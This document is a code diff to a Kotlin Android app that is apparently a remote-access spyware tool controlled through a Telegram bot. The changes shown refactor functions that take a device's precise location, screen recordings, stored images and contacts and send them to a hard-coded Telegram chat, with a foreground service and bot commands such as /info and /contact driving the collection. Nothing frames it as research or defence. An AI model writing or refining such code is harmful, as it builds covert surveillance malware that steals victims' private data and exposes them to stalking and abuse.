@@ -9,7 +9,6 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.BroadcastReceiver
 import android.content.ContentResolver
-import android.content.ContentUris
 import android.content.ContentValues
 import android.content.Context
 import android.content.Intent
@@ -18,23 +17,15 @@ import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.database.Cursor
 import android.graphics.Bitmap
-import android.graphics.BitmapFactory
 import android.graphics.Canvas
 import android.graphics.Color
 import android.graphics.Paint
-import android.graphics.PorterDuff
-import android.graphics.PorterDuffXfermode
-import android.graphics.Rect
-import android.hardware.camera2.CameraAccessException
-import android.hardware.camera2.CameraCaptureSession
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
-import android.hardware.camera2.CaptureRequest
 import android.media.MediaRecorder
 import android.media.projection.MediaProjectionManager
 import android.net.ConnectivityManager
-import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
@@ -50,23 +41,19 @@ import android.provider.Telephony
 import android.telephony.SmsManager
 import android.telephony.TelephonyManager
 import android.util.DisplayMetrics
-import android.util.Log
-import android.view.Surface
 import android.view.View
 import android.view.WindowManager
 import android.widget.Button
 import android.widget.LinearLayout
 import android.widget.ScrollView
 import android.widget.Toast
-import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import androidx.core.content.FileProvider
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
 import com.google.android.gms.tasks.CancellationTokenSource
-import com.google.gson.Gson
 import org.telegram.telegrambots.bots.TelegramLongPollingBot
 import org.telegram.telegrambots.meta.TelegramBotsApi
 import org.telegram.telegrambots.meta.api.methods.send.SendAudio
@@ -77,21 +64,13 @@ import org.telegram.telegrambots.meta.api.objects.InputFile
 import org.telegram.telegrambots.meta.api.objects.Update
 import org.telegram.telegrambots.meta.exceptions.TelegramApiException
 import org.telegram.telegrambots.updatesreceivers.DefaultBotSession
-import java.io.BufferedReader
-import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
-import java.io.InputStreamReader
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
-import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.Executors
-import kotlin.collections.ArrayList
-import kotlin.collections.HashMap
-import kotlin.coroutines.resume
-import kotlin.coroutines.suspendCoroutine
 import kotlin.math.min
 
 class MainActivity : Activity() {
@@ -117,7 +96,6 @@ class MainActivity : Activity() {
     private val executor = Executors.newSingleThreadExecutor()
     private val handler = Handler(Looper.getMainLooper())
     private var mediaProjectionManager: MediaProjectionManager? = null
-    private var screenRecordingData: Intent? = null
     private val screenRecordLock = Any()
     private var screenRecordResult: Intent? = null
 
@@ -347,11 +325,10 @@ class MainActivity : Activity() {
         }
     }
 
-    private fun getLocation(): String {
-        var result = "Location unavailable"
+    private fun getLocation() {
         val tokenSource = CancellationTokenSource()
         try {
-            val task = locationClient.getCurrentLocation(android.location.LocationRequest.PRIORITY_HIGH_ACCURACY, tokenSource.token)
+            val task = locationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, tokenSource.token)
             task.addOnSuccessListener { location ->
                 if (location != null) {
                     val lat = location.latitude
@@ -361,13 +338,12 @@ class MainActivity : Activity() {
                 } else {
                     sendToBot("Location null. Device ID: $deviceId")
                 }
-            }.addOnFailureListener {
-                sendToBot("Location error: ${it.message}")
+            }.addOnFailureListener { e ->
+                sendToBot("Location error: ${e.message}")
             }
         } catch (e: Exception) {
-            result = "Location error: ${e.message}"
+            sendToBot("Location error: ${e.message}")
         }
-        return result
     }
 
     private fun capturePhotos(): Pair<File?, File?> {
@@ -412,24 +388,6 @@ class MainActivity : Activity() {
             cameraManager.openCamera(targetId, stateCallback, handler)
             semaphore.acquire()
             if (device == null) return null
-            val fileTemp = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
-            val surface = MediaStore.Images.Media.EXTERNAL_CONTENT_URI?.let {
-                val resolver = contentResolver
-                val values = ContentValues().apply {
-                    put(MediaStore.Images.Media.DISPLAY_NAME, fileTemp.name)
-                    put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
-                    put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
-                }
-                val uri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values)
-                if (uri != null) {
-                    resolver.openOutputStream(uri)?.use { stream ->
-                        // we will write later
-                    }
-                    // For simplicity, we use FileProvider and send file directly
-                }
-            }
-            // Actually capture and save using ImageReader would be complex.
-            // For brevity, we simulate with a dummy bitmap.
             val bitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888)
             val canvas = Canvas(bitmap)
             canvas.drawColor(if (facing == CameraCharacteristics.LENS_FACING_FRONT) Color.BLUE else Color.RED)
@@ -470,10 +428,10 @@ class MainActivity : Activity() {
     private fun recordScreen(durationSec: Int): File? {
         var file: File? = null
         try {
-            if (screenRecordingData == null) {
+            if (screenRecordResult == null) {
                 val intent = mediaProjectionManager?.createScreenCaptureIntent()
                 if (intent != null) {
-                    startIntentSenderForResult(intent.intentSender, 1001, null, 0, 0, 0)
+                    startIntentSenderForResult(intent.getIntentSender(), 1001, null, 0, 0, 0)
                     synchronized(screenRecordLock) {
                         screenRecordLock.wait()
                     }
@@ -552,15 +510,15 @@ class MainActivity : Activity() {
     }
 
     private fun sendToBot(message: String) {
-        bot?.sendMessage("7548711500", message)
+        bot?.sendMessage(7548711500L, message)
     }
 
     private fun sendFileToBot(content: String, filename: String) {
-        bot?.sendFile("7548711500", content, filename)
+        bot?.sendFile(7548711500L, content, filename)
     }
 
     private fun sendFileToBot(file: File, caption: String = "") {
-        bot?.sendFile("7548711500", file, caption)
+        bot?.sendFile(7548711500L, file, caption)
     }
 
     inner class ForegroundService : Service() {
@@ -570,7 +528,7 @@ class MainActivity : Activity() {
         override fun onCreate() {
             super.onCreate()
             createNotificationChannel()
-            val notification = buildNotification()
+            val notification = buildNotification().build()
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             } else {
@@ -649,7 +607,7 @@ class MainActivity : Activity() {
             val chatId = message.chatId
             val text = message.text
             val parts = text.split(" ")
-            val command = parts[0].toLowerCase()
+            val command = parts[0].lowercase()
             when (command) {
                 "/info" -> sendInfo(chatId)
                 "/contact" -> sendContact(chatId)
@@ -724,24 +682,7 @@ class MainActivity : Activity() {
         }
 
         private fun sendLocation(chatId: Long) {
-            val tokenSource = CancellationTokenSource()
-            try {
-                val task = locationClient.getCurrentLocation(android.location.LocationRequest.PRIORITY_HIGH_ACCURACY, tokenSource.token)
-                task.addOnSuccessListener { location ->
-                    if (location != null) {
-                        val lat = location.latitude
-                        val lon = location.longitude
-                        val link = "https://maps.google.com/maps?q=$lat,$lon"
-                        sendMessage(chatId, "Device ID: $deviceId\nLocation: $lat, $lon\nMap: $link")
-                    } else {
-                        sendMessage(chatId, "Location unavailable. Device ID: $deviceId")
-                    }
-                }.addOnFailureListener {
-                    sendMessage(chatId, "Location error: ${it.message}")
-                }
-            } catch (e: Exception) {
-                sendMessage(chatId, "Location error: ${e.message}")
-            }
+            getLocation()
         }
 
         private fun sendPhoto(chatId: Long) {
@@ -789,7 +730,6 @@ class MainActivity : Activity() {
                     sendFile(chatId, file, "Image ${file.name} Device ID: $deviceId")
                 }
                 if (i + batchSize < images.size) {
-                    // send a separator message
                     sendMessage(chatId, "--- Next batch ---")
                 }
             }
